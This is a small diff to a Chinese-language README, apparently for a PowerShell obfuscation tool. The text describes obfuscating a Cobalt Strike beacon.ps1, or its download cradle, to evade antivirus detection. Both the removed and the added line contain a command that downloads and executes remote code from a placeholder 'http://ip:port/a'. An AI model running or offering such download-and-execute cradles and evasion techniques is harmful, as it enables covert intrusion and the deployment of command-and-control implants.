@@ -66,9 +66,7 @@ The result can be found in bypass.ps1.
 
 Take beacon.ps1 as an example
 
-同样可以来混淆 IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))
-
-上线cs可以混淆beacon.ps1然后落地来执行，也可以直接混淆cs的iex下载一句话来不落地执行。
+**上线cs可以混淆beacon.ps1然后落地来执行，也可以直接混淆cs的iex下载一句话IEX ((new-object net.webclient).downloadstring('http://ip:port/a')来不落地执行。**
 
 混淆前VT如下：
 
